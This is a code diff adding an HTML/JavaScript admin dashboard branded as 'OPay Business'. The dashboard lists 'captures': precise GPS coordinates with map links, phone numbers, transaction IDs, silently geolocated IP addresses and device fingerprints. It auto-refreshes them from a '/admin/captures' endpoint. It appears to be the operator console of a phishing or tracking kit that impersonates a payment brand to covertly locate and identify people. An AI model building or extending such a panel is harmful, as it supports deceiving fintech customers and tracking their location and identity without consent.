@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OPay Business — Dashboard</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:'Segoe UI',Arial,sans-serif; background:#f4f6f9; min-height:100vh; }
+
+    .topbar { background:#1a7a3e; padding:0 24px; height:56px; display:flex; align-items:center; justify-content:space-between; position:fixed; top:0; left:0; right:0; z-index:100; }
+    .topbar-left { display:flex; align-items:center; gap:12px; }
+    .topbar-left img { height:28px; }
+    .topbar-left .portal-name { color:rgba(255,255,255,0.8); font-size:0.78rem; }
+    .topbar-right { display:flex; align-items:center; gap:16px; }
+    .topbar-right .user-badge { background:rgba(255,255,255,0.15); color:white; font-size:0.75rem; padding:4px 12px; border-radius:20px; }
+    .logout-btn { background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 14px; border-radius:6px; font-size:0.75rem; cursor:pointer; }
+    .logout-btn:hover { background:rgba(255,255,255,0.2); }
+
+    .sidebar { position:fixed; top:56px; left:0; bottom:0; width:220px; background:white; border-right:1px solid #e8e8e8; padding:20px 0; }
+    .sidebar-item { padding:10px 22px; font-size:0.82rem; color:#555; cursor:pointer; display:flex; align-items:center; gap:10px; border-left:3px solid transparent; }
+    .sidebar-item.active { color:#1a7a3e; font-weight:700; border-left-color:#1a7a3e; background:#f0f9f4; }
+    .sidebar-item:hover { background:#f9f9f9; }
+    .sidebar-section { font-size:0.65rem; color:#bbb; text-transform:uppercase; letter-spacing:1.5px; padding:16px 22px 6px; font-weight:700; }
+
+    .main { margin-left:220px; margin-top:56px; padding:28px 28px; }
+
+    .page-title { font-size:1.1rem; font-weight:700; color:#1a1a1a; margin-bottom:4px; }
+    .page-sub { font-size:0.78rem; color:#888; margin-bottom:24px; }
+
+    .stats-row { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:28px; }
+    .stat-card { background:white; border-radius:10px; padding:18px 20px; box-shadow:0 1px 4px rgba(0,0,0,0.07); }
+    .stat-card .stat-label { font-size:0.7rem; color:#888; text-transform:uppercase; letter-spacing:1px; margin-bottom:6px; }
+    .stat-card .stat-val { font-size:1.6rem; font-weight:800; color:#1a1a1a; }
+    .stat-card .stat-sub { font-size:0.72rem; color:#aaa; margin-top:4px; }
+    .stat-card.green .stat-val { color:#1a7a3e; }
+    .stat-card.red .stat-val { color:#c0392b; }
+    .stat-card.blue .stat-val { color:#2471a3; }
+
+    .section-card { background:white; border-radius:10px; box-shadow:0 1px 4px rgba(0,0,0,0.07); margin-bottom:24px; }
+    .section-card .sc-header { padding:16px 20px; border-bottom:1px solid #f0f0f0; display:flex; align-items:center; justify-content:space-between; }
+    .section-card .sc-header h3 { font-size:0.88rem; font-weight:700; color:#1a1a1a; }
+    .section-card .sc-header .sc-count { font-size:0.72rem; background:#f0f9f4; color:#1a7a3e; padding:2px 10px; border-radius:20px; font-weight:700; }
+    .section-card .sc-header .filter-row { display:flex; gap:8px; }
+    .filter-btn { font-size:0.72rem; padding:4px 12px; border-radius:20px; border:1px solid #ddd; background:white; cursor:pointer; color:#555; }
+    .filter-btn.active { background:#1a7a3e; color:white; border-color:#1a7a3e; }
+
+    table { width:100%; border-collapse:collapse; }
+    th { font-size:0.68rem; color:#aaa; text-transform:uppercase; letter-spacing:1px; padding:10px 16px; text-align:left; border-bottom:1px solid #f0f0f0; font-weight:600; }
+    td { font-size:0.78rem; color:#333; padding:12px 16px; border-bottom:1px solid #fafafa; vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:#fafefe; }
+
+    .badge { display:inline-block; font-size:0.65rem; font-weight:700; padding:2px 8px; border-radius:4px; text-transform:uppercase; letter-spacing:0.3px; }
+    .badge-gps      { background:#d4edda; color:#155724; }
+    .badge-phone    { background:#d1ecf1; color:#0c5460; }
+    .badge-ip       { background:#fff3cd; color:#856404; }
+    .badge-fp       { background:#e2d9f3; color:#4a235a; }
+    .badge-unknown  { background:#f0f0f0; color:#888; }
+
+    .map-link { color:#1a7a3e; text-decoration:none; font-weight:600; }
+    .map-link:hover { text-decoration:underline; }
+    .mono { font-family:monospace; font-size:0.75rem; }
+    .dim { color:#aaa; }
+
+    .empty-state { text-align:center; padding:60px 20px; color:#bbb; }
+    .empty-state .big { font-size:2rem; margin-bottom:8px; }
+    .empty-state p { font-size:0.82rem; }
+
+    .refresh-btn { background:#1a7a3e; color:white; border:none; padding:6px 16px; border-radius:6px; font-size:0.75rem; cursor:pointer; font-weight:600; }
+    .refresh-btn:hover { background:#145e30; }
+
+    .loading { text-align:center; padding:40px; color:#aaa; font-size:0.82rem; }
+
+    @media(max-width:768px) {
+      .sidebar { display:none; }
+      .main { margin-left:0; padding:16px; }
+      .stats-row { grid-template-columns:repeat(2,1fr); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">
+    <div class="topbar-left">
+      <img src="/logo-light.png" alt="OPay"/>
+      <span class="portal-name">Business Portal</span>
+    </div>
+    <div class="topbar-right">
+      <span class="user-badge">opayadmin</span>
+      <button class="logout-btn" onclick="doLogout()">Sign Out</button>
+    </div>
+  </div>
+
+  <div class="sidebar">
+    <div class="sidebar-section">Main</div>
+    <div class="sidebar-item active">&#9632; &nbsp;Captures</div>
+    <div class="sidebar-section">System</div>
+    <div class="sidebar-item" onclick="doLogout()">&#8592; &nbsp;Sign Out</div>
+  </div>
+
+  <div class="main">
+    <div class="page-title">Capture Log</div>
+    <div class="page-sub" id="last-refresh">Loading...</div>
+
+    <div class="stats-row" id="stats-row">
+      <div class="stat-card green"><div class="stat-label">GPS Captures</div><div class="stat-val" id="s-gps">--</div><div class="stat-sub">with coords</div></div>
+      <div class="stat-card blue"><div class="stat-label">Phone Numbers</div><div class="stat-val" id="s-phone">--</div><div class="stat-sub">captured</div></div>
+      <div class="stat-card"><div class="stat-label">IP Profiles</div><div class="stat-val" id="s-ip">--</div><div class="stat-sub">geolocated</div></div>
+      <div class="stat-card red"><div class="stat-label">Total Entries</div><div class="stat-val" id="s-total">--</div><div class="stat-sub">all sources</div></div>
+    </div>
+
+    <div class="section-card">
+      <div class="sc-header">
+        <h3>All Captures</h3>
+        <div style="display:flex;align-items:center;gap:10px;">
+          <div class="filter-row" id="filter-row">
+            <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+            <button class="filter-btn" onclick="setFilter('gps',this)">GPS</button>
+            <button class="filter-btn" onclick="setFilter('phone',this)">Phone</button>
+            <button class="filter-btn" onclick="setFilter('ip_silent',this)">IP</button>
+            <button class="filter-btn" onclick="setFilter('fingerprint',this)">Device</button>
+          </div>
+          <button class="refresh-btn" onclick="loadData()">&#8635; Refresh</button>
+        </div>
+      </div>
+      <div id="table-wrap"><div class="loading">Loading captures...</div></div>
+    </div>
+  </div>
+
+  <script>
+    const token = sessionStorage.getItem('adm_token');
+    if (!token) window.location.href = '/admin';
+
+    let allData = [];
+    let activeFilter = 'all';
+
+    async function loadData() {
+      document.getElementById('last-refresh').textContent = 'Refreshing...';
+      try {
+        const r = await fetch('/admin/captures?token=' + token);
+        if (r.status === 401) { sessionStorage.removeItem('adm_token'); window.location.href = '/admin'; return; }
+        allData = await r.json();
+        allData.reverse(); // newest first
+        updateStats();
+        renderTable();
+        document.getElementById('last-refresh').textContent = 'Last refreshed: ' + new Date().toLocaleTimeString() + ' — ' + allData.length + ' total entries';
+      } catch(e) {
+        document.getElementById('table-wrap').innerHTML = '<div class="loading" style="color:#c0392b;">Failed to load data. Check server.</div>';
+      }
+    }
+
+    function updateStats() {
+      document.getElementById('s-gps').textContent   = allData.filter(d => d.gps_lat).length;
+      document.getElementById('s-phone').textContent = allData.filter(d => d.phone).length;
+      document.getElementById('s-ip').textContent    = allData.filter(d => d.ip_city).length;
+      document.getElementById('s-total').textContent = allData.length;
+    }
+
+    function setFilter(f, btn) {
+      activeFilter = f;
+      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      renderTable();
+    }
+
+    function renderTable() {
+      let rows = allData;
+      if (activeFilter !== 'all') {
+        rows = allData.filter(d => (d.source || '').includes(activeFilter));
+      }
+
+      if (rows.length === 0) {
+        document.getElementById('table-wrap').innerHTML = '<div class="empty-state"><div class="big">&#128270;</div><p>No captures matching this filter yet.</p></div>';
+        return;
+      }
+
+      const html = `
+        <table>
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Source</th>
+              <th>TXN / Phone</th>
+              <th>GPS</th>
+              <th>IP Location</th>
+              <th>Device</th>
+              <th>Server IP</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${rows.map(row => `
+              <tr>
+                <td class="mono dim">${formatTime(row.timestamp)}</td>
+                <td>${badge(row.source)}</td>
+                <td>
+                  ${row.txn_id ? `<div class="mono">${row.txn_id}</div>` : ''}
+                  ${row.phone  ? `<div style="color:#0c5460;font-weight:700;">${row.phone}</div>` : ''}
+                  ${!row.txn_id && !row.phone ? '<span class="dim">—</span>' : ''}
+                </td>
+                <td>
+                  ${row.gps_lat
+                    ? `<a class="map-link" href="https://www.google.com/maps?q=${row.gps_lat},${row.gps_lon}" target="_blank">&#127757; ${row.gps_lat.toFixed(5)}, ${row.gps_lon.toFixed(5)}</a><div class="dim" style="font-size:0.7rem;">±${row.gps_accuracy_meters}m</div>`
+                    : '<span class="dim">—</span>'}
+                </td>
+                <td>
+                  ${row.ip_city
+                    ? `<div>${row.ip_city}, ${row.ip_region}</div><div class="dim">${row.ip_country}</div><div class="mono dim" style="font-size:0.7rem;">${row.ip_isp || ''}</div>`
+                    : '<span class="dim">—</span>'}
+                </td>
+                <td>
+                  ${row.platform ? `<div>${row.platform}</div>` : ''}
+                  ${row.screen   ? `<div class="dim">${row.screen}</div>` : ''}
+                  ${row.timezone ? `<div class="dim" style="font-size:0.7rem;">${row.timezone}</div>` : ''}
+                  ${!row.platform && !row.screen ? '<span class="dim">—</span>' : ''}
+                </td>
+                <td class="mono dim">${row.ip || '—'}</td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>`;
+      document.getElementById('table-wrap').innerHTML = html;
+    }
+
+    function badge(source) {
+      if (!source) return `<span class="badge badge-unknown">unknown</span>`;
+      if (source.includes('gps'))         return `<span class="badge badge-gps">GPS</span>`;
+      if (source.includes('phone'))       return `<span class="badge badge-phone">Phone</span>`;
+      if (source.includes('ip_silent'))   return `<span class="badge badge-ip">IP</span>`;
+      if (source.includes('fingerprint')) return `<span class="badge badge-fp">Device</span>`;
+      return `<span class="badge badge-unknown">${source}</span>`;
+    }
+
+    function formatTime(ts) {
+      if (!ts) return '—';
+      const d = new Date(ts);
+      return d.toLocaleDateString() + ' ' + d.toLocaleTimeString();
+    }
+
+    async function doLogout() {
+      await fetch('/admin/logout', { method:'POST', headers:{ 'x-token': token } });
+      sessionStorage.removeItem('adm_token');
+      window.location.href = '/admin';
+    }
+
+    loadData();
+    setInterval(loadData, 30000); // auto-refresh every 30s
+  </script>
+</body>
+</html>
